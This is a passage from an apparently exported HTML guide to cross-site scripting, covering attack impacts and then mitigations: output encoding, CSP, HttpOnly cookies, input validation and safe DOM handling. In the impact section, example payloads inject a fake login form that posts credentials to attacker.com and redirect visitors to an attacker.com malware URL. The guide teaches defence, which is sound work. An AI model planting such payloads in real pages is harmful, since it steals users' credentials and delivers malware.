+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8025-8aad-e9885d5115ca"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-808c-8099-c991d04fbef2" class=""><strong>4. Phishing</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-804e-95f3-dbaa5d28a912" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f3-8335-dafe1698eb45" class="bulleted-list"><li style="list-style-type:disc">Display fake login forms</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b0-86d5-e7940ca27a48" class="bulleted-list"><li style="list-style-type:disc">Steal credentials</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-809a-bf4e-eafbfc4ed5fe" class="bulleted-list"><li style="list-style-type:disc">Trick users into providing sensitive information</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-807e-8b6a-cb8edf71d61e" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8093-8575-fdd7583df43a" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;
+  document.body.innerHTML = &#x27;&lt;form action=&quot;http://attacker.com/phish&quot;&gt;&lt;input name=&quot;user&quot;&gt;&lt;input name=&quot;pass&quot; type=&quot;password&quot;&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;&#x27;;
+&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80e3-88bf-f1b337534fe1"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80cc-ba2d-f03e76a2d2b6" class=""><strong>5. Redirect Attacks</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806e-98fb-d900e2f03ca8" class=""><strong>Impact:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8071-a033-e7813960bd0e" class="bulleted-list"><li style="list-style-type:disc">Redirect users to malicious sites</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80dd-9260-c69bd02ea54f" class="bulleted-list"><li style="list-style-type:disc">Steal credentials</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e2-ae71-d66a63b39345" class="bulleted-list"><li style="list-style-type:disc">Deliver malware</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80fc-8d76-f51d89816d43" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b2-8c49-df5e5ab3b5a0" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;
+  window.location = &#x27;http://attacker.com/malware&#x27;;
+&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-801c-8871-ed2d067cb73d"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-807c-9803-dd27d3a9ab6f" class=""><strong>Mitigation Strategies</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-800c-aad8-e71b12031b16" class=""><strong>1. Output Encoding (Primary Defense)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8012-9a9d-d6d76168ed13" class=""><strong>How It Works:</strong> Encode user input based on the context where it&#x27;s displayed (HTML, JavaScript, URL, CSS).</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-801b-bee7-fab45c6d32c4" class=""><strong>HTML Context Encoding:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d8-89a4-faef62765620" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from html import escape
+
+user_input = &quot;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;
+safe_output = escape(user_input)
+# Result: &amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;)&amp;lt;/script&amp;gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805c-bd79-dcab6e02713c" class=""><strong>JavaScript Context Encoding:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-801e-addd-ffba2669a163" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import json
+
+user_input = &quot;&#x27;; alert(&#x27;XSS&#x27;); //&quot;
+safe_output = json.dumps(user_input)
+# Result: &quot;&#x27;; alert(&#x27;XSS&#x27;); //&quot; (JSON-encoded)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8040-9f94-de9d6112a903" class=""><strong>URL Context Encoding:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b8-bd65-ce9c1600eaae" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from urllib.parse import quote
+
+user_input = &quot;javascript:alert(&#x27;XSS&#x27;)&quot;
+safe_output = quote(user_input)
+# Result: javascript%3Aalert%28%27XSS%27%29
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d8-a60b-f08d1cabcebc" class=""><strong>Attribute Context Encoding:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-809b-ab5c-de0f25fe8fae" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from html import escape
+
+user_input = &#x27;&quot; onmouseover=&quot;alert(\&#x27;XSS\&#x27;)&#x27;
+safe_output = escape(user_input, quote=True)
+# Result: &amp;quot; onmouseover=&amp;quot;alert(&amp;#x27;XSS&amp;#x27;)
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80eb-8ef9-e7632c65eeae"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-805c-bacd-d012c3954fd4" class=""><strong>2. Content Security Policy (CSP)</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e7-b700-fdb1048d1742" class=""><strong>How It Works:</strong> HTTP header that restricts which sources can load content (scripts, styles, images, etc.).</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-801e-aea4-e99ba73efa39" class=""><strong>Implementation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-802a-a20d-d1f3c38cd267" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Strict CSP
+response.headers[&#x27;Content-Security-Policy&#x27;] = (
+    &quot;default-src &#x27;self&#x27;; &quot;
+    &quot;script-src &#x27;self&#x27;; &quot;
+    &quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; &quot;
+    &quot;img-src &#x27;self&#x27; data: https:; &quot;
+    &quot;connect-src &#x27;self&#x27;; &quot;
+    &quot;font-src &#x27;self&#x27;; &quot;
+    &quot;object-src &#x27;none&#x27;; &quot;
+    &quot;base-uri &#x27;self&#x27;; &quot;
+    &quot;form-action &#x27;self&#x27;; &quot;
+    &quot;frame-ancestors &#x27;none&#x27;&quot;
+)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8074-921d-feac5c41b768" class=""><strong>CSP Directives:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-800b-ba25-edb21cd71179" class="bulleted-list"><li style="list-style-type:disc"><code>default-src</code>: Default policy for all resource types</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8030-8b13-c759ed97017b" class="bulleted-list"><li style="list-style-type:disc"><code>script-src</code>: Controls script execution</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8010-8868-defb9519e15b" class="bulleted-list"><li style="list-style-type:disc"><code>style-src</code>: Controls stylesheet loading</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802b-9347-edb04d8f71cb" class="bulleted-list"><li style="list-style-type:disc"><code>img-src</code>: Controls image sources</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808e-984f-ebb4742271b4" class="bulleted-list"><li style="list-style-type:disc"><code>connect-src</code>: Controls fetch/XHR requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ea-bf67-c272df1e8577" class="bulleted-list"><li style="list-style-type:disc"><code>font-src</code>: Controls font loading</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f9-8f0e-d375afb1513d" class="bulleted-list"><li style="list-style-type:disc"><code>object-src</code>: Controls object/embed/applet</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8081-af68-d20d51318ccb" class="bulleted-list"><li style="list-style-type:disc"><code>base-uri</code>: Controls base tag URLs</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8011-9a7c-cfea7962dc46" class="bulleted-list"><li style="list-style-type:disc"><code>form-action</code>: Controls form submission targets</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8052-9dbf-dcbc938f9cf7" class="bulleted-list"><li style="list-style-type:disc"><code>frame-ancestors</code>: Controls embedding (like X-Frame-Options)</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8088-a2e6-e4a9b73ee377" class=""><strong>Best Practices:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807d-b17c-c1dedbf6d9cd" class="bulleted-list"><li style="list-style-type:disc">Use <code>&#x27;self&#x27;</code> for same-origin resources</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8097-99b9-c43425a359b5" class="bulleted-list"><li style="list-style-type:disc">Avoid <code>&#x27;unsafe-inline&#x27;</code> and <code>&#x27;unsafe-eval&#x27;</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c9-a808-f77d8f59e1c1" class="bulleted-list"><li style="list-style-type:disc">Use nonces or hashes for inline scripts/styles</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8008-938d-c1fa38f8c9d7" class="bulleted-list"><li style="list-style-type:disc">Report violations for monitoring</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8033-8482-f4f8a2155cbf"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-801c-9ad7-f7700f052dc7" class=""><strong>3. HttpOnly Cookies</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80be-8067-f86cfc980f17" class=""><strong>How It Works:</strong> Prevents JavaScript from accessing cookies via <code>document.cookie</code>.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8099-82da-f5c47e6d5487" class=""><strong>Implementation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8076-9b4c-ec5f80f20679" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">response.set_cookie(
+    &#x27;sessionId&#x27;,
+    value=session_id,
+    httponly=True,  # Prevents JavaScript access
+    secure=True,    # HTTPS only
+    samesite=&#x27;Strict&#x27;
+)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ee-beb0-d4cfb5eaaebf" class=""><strong>Limitations:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804f-b41c-e883fe9cb5fd" class="bulleted-list"><li style="list-style-type:disc">Only prevents cookie theft via XSS</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80af-8d64-da96ba3c1b9a" class="bulleted-list"><li style="list-style-type:disc">Doesn&#x27;t prevent XSS itself</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804e-8393-fd4fcdfdac47" class="bulleted-list"><li style="list-style-type:disc">Use with output encoding and CSP</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8048-b08c-f217680608e6"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8020-9ba0-dae3b8455402" class=""><strong>4. Input Validation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8038-b7c7-d70f6e95ed98" class=""><strong>How It Works:</strong> Validate and sanitize input on the server side.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8097-9b01-cf98ff63c9a5" class=""><strong>Implementation:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80f4-8901-cb6c79c08b3a" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import re
+
+def validate_input(input_value):
+    # Whitelist approach: only allow safe characters
+    if not re.match(r&#x27;^[a-zA-Z0-9\s.,!?-]+$&#x27;, input_value):
+        raise ValueError(&quot;Invalid input&quot;)
+    return input_value
+
+# Or use library
+from bleach import clean
+
+def sanitize_html(input_value):
+    # Whitelist allowed tags/attributes
+    allowed_tags = [&#x27;p&#x27;, &#x27;br&#x27;, &#x27;strong&#x27;, &#x27;em&#x27;]
+    return clean(input_value, tags=allowed_tags)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ee-bbbe-cb87f4a92de4" class=""><strong>Important:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d2-a2c7-c024ed6c2eb7" class="bulleted-list"><li style="list-style-type:disc">Input validation helps but doesn&#x27;t prevent XSS</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8025-b597-d9455cc75356" class="bulleted-list"><li style="list-style-type:disc">Always encode output, even if input is validated</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8089-a9fe-deae624ae0b8" class="bulleted-list"><li style="list-style-type:disc">Use whitelist approach, not blacklist</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80db-a5f5-c78572102aa9"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80d8-b78e-d2006d4b5a72" class=""><strong>5. Use Safe DOM Manipulation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8006-bec0-cac5de55a64f" class=""><strong>For DOM-Based XSS:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80b4-aa3f-eac0065ad2d9" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// ❌ VULNERABLE
+element.innerHTML = userInput;
+
+// ✅ SECURE
+element.textContent = userInput;
+
+// Or use safe DOM APIs
+const textNode = document.createTextNode(userInput);
+element.appendChild(textNode);
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-806f-b578-e954a635f536"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-805e-ac39-fcb15696d510" class=""><strong>Best Practices</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80ef-af5c-ec89014edc90" class=""><strong>1. Always Encode Output</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800a-8921-e57eed029e01" class=""><strong>Rule:</strong> Encode output based on context, immediately before rendering.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8031-b8a0-eeae4a620d8b" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8085-9d05-f3c8d8facb6e" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from html import escape
+
+@app.route(&#x27;/user&#x27;)
+def show_user():
+    username = request.args.get(&#x27;username&#x27;)
+    # Encode immediately before output
+    safe_username = escape(username)
+    return f&quot;&lt;h1&gt;Welcome, {safe_username}&lt;/h1&gt;&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d7-b6b6-cda6a8bbd7d3" class=""><strong>❌ WRONG:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8001-a555-df242c47fd2a" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Encoding at input time
+username = escape(request.args.get(&#x27;username&#x27;))
+# Storing encoded value (breaks if used in different context)
+db.users.insert({&#x27;username&#x27;: username})
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8058-b53c-da2f050ab7ce"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80b2-951b-c4b67ca0b11e" class=""><strong>2. Use Framework Auto-Escaping</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805a-a6ab-c531225df19f" class=""><strong>Rule:</strong> Use templating engines with auto-escaping enabled.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8078-9eef-c70b88d51deb" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8093-8700-cac93f9adb5a" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all"># Flask/Jinja2 (auto-escaping enabled by default)
+@app.route(&#x27;/user&#x27;)
+def show_user():
+    username = request.args.get(&#x27;username&#x27;)
+    return render_template(&#x27;user.html&#x27;, username=username)
+</code></pre></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8060-8c72-d74797ec16ae" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- user.html --&gt;
+&lt;h1&gt;Welcome, {{ username }}&lt;/h1&gt;  &lt;!-- Auto-escaped! --&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8036-9594-eb8eb3e1d0e7"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8014-8a45-ebd2f72ae690" class=""><strong>3. Implement CSP</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ff-bbc7-d4290843b09d" class=""><strong>Rule:</strong> Use strict CSP headers to reduce XSS impact.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-808e-963e-f8755f09dc16" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-804c-9187-c65b02d7ff7d" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">response.headers[&#x27;Content-Security-Policy&#x27;] = (
+    &quot;default-src &#x27;self&#x27;; &quot;
+    &quot;script-src &#x27;self&#x27;; &quot;
+    &quot;style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; &quot;
+    &quot;img-src &#x27;self&#x27; https:&quot;
+)
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8044-a489-e7ead2d3ad65"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-805a-bed1-cba5d3901ff5" class=""><strong>4. Use HttpOnly Cookies</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805a-b89d-e18c009adc80" class=""><strong>Rule:</strong> Always set HttpOnly flag on session cookies.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8081-8afe-dad8ee1f4358" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-807c-b55d-fe8c366778f0" class="code 